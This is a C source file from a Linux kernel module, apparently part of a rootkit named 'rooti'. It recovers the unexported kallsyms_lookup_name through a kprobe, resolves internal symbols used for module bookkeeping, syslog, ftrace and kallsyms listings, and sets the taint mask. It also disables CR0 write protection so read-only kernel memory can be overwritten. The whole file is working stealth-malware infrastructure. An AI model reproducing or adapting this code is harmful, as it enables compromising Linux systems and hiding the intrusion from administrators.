#include <linux/kprobes.h>
#include <linux/mutex_types.h>
#include <linux/notifier.h>
#include <linux/seq_file.h>
#include <linux/bpf.h>
#include <linux/module.h>
#include <asm/paravirt.h>
#include <net/sock.h>
#include "utils.h"

#define ROOTI_RESOLVE_SYM_ADDR(var, symbol, type)           \
var = (type)rooti_sym_repo.kallsyms_lookup_name(symbol);    \
if (var == NULL) {                                          \
    ROOTI_DEBUG("unresolved symbol %s", symbol);            \
    return -ENOENT;                                         \
}

#define ROOTI_RESOLVE_FUNC_ADDR(var, symbol, return_type, ...)  \
ROOTI_RESOLVE_SYM_ADDR(var, symbol, return_type(*)(__VA_ARGS__))


struct rooti_sym_repo rooti_sym_repo;

/*
    Since kernel version 5.7.7 kallsyms_lookup_name() is no longer exported to out-of-tree modules.
    We can work around this by probing the function, which will find us its memory address.
*/
static int rooti_resolve_kln_addr(void)
{
    struct kprobe kp;
    int err;

    memset(&kp, 0, sizeof(kp));
    kp.symbol_name = "kallsyms_lookup_name";

    err = register_kprobe(&kp);
    if (err) {
        ROOTI_DEBUG("register_kprobe() failed: %d", err);
        return err;
    }

    rooti_sym_repo.kallsyms_lookup_name = (unsigned long (*)(const char *name))kp.addr;
    unregister_kprobe(&kp);

    return 0;
}

int rooti_resolve_unexported_syms(void)
{
    int err = rooti_resolve_kln_addr();
    if (err) {
        ROOTI_DEBUG("rooti_resolve_kln_addr failed: %d", err);
        return err;
    }

    ROOTI_RESOLVE_SYM_ADDR(rooti_sym_repo.tainted_mask, "tainted_mask", unsigned long *);
    ROOTI_RESOLVE_SYM_ADDR(rooti_sym_repo.kallsyms_op, "kallsyms_op", struct seq_operations *);
    ROOTI_RESOLVE_SYM_ADDR(rooti_sym_repo.show_ftrace_seq_ops, "show_ftrace_seq_ops", struct seq_operations *);
    ROOTI_RESOLVE_SYM_ADDR(rooti_sym_repo.module_mutex, "module_mutex", struct mutex *);
    ROOTI_RESOLVE_SYM_ADDR(rooti_sym_repo.module_notify_list, "module_notify_list", struct blocking_notifier_head *);

    ROOTI_RESOLVE_FUNC_ADDR(rooti_sym_repo.do_syslog, "do_syslog", int , int, char*, int, int);
    ROOTI_RESOLVE_FUNC_ADDR(rooti_sym_repo.mod_sysfs_teardown, "mod_sysfs_teardown", void, struct module *);
    ROOTI_RESOLVE_FUNC_ADDR(rooti_sym_repo.module_arch_cleanup, "module_arch_cleanup", void, struct module *);
    ROOTI_RESOLVE_FUNC_ADDR(rooti_sym_repo.module_unload_free, "module_unload_free", void, struct module *);
    ROOTI_RESOLVE_FUNC_ADDR(rooti_sym_repo.module_destroy_params, "module_destroy_params", void, const struct kernel_param *, unsigned);
    ROOTI_RESOLVE_FUNC_ADDR(rooti_sym_repo.mod_tree_remove, "mod_tree_remove", void, struct module *);
    ROOTI_RESOLVE_FUNC_ADDR(rooti_sym_repo.module_bug_cleanup, "module_bug_cleanup", void, struct module *);
    ROOTI_RESOLVE_FUNC_ADDR(rooti_sym_repo.module_arch_freeing_init, "module_arch_freeing_init", void, struct module *);
   	ROOTI_RESOLVE_FUNC_ADDR(rooti_sym_repo.klp_module_going, "klp_module_going", void, struct module *);
    ROOTI_RESOLVE_FUNC_ADDR(rooti_sym_repo.ftrace_release_mod, "ftrace_release_mod", void, struct module *);
    ROOTI_RESOLVE_FUNC_ADDR(rooti_sym_repo.__sk_attach_prog, "__sk_attach_prog", int , struct bpf_prog *, struct sock *);

    return 0;
}

inline void rooti_force_write_cr0(unsigned long val)
{
    unsigned long __force_order;
    asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
}

inline void rooti_unprotect_memory(void)
{
    rooti_force_write_cr0(read_cr0() & (~X86_CR0_WP));
}

inline void rooti_protect_memory(void)
{
    rooti_force_write_cr0(read_cr0() | (X86_CR0_WP));
}
